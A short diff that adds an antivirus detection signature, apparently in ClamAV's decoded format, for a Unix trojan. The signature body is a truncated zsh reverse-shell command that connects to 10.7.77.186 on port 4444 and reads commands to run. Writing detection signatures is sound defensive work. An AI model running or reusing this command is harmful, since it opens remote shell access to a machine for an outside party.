@@ -1,0 +1,5 @@
+VIRUS NAME: Unix.Trojan.MSShellcode-24
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+zmodload zsh/net/tcp;ztcp 10.7.77.186 4444;while read -r cmd <&$
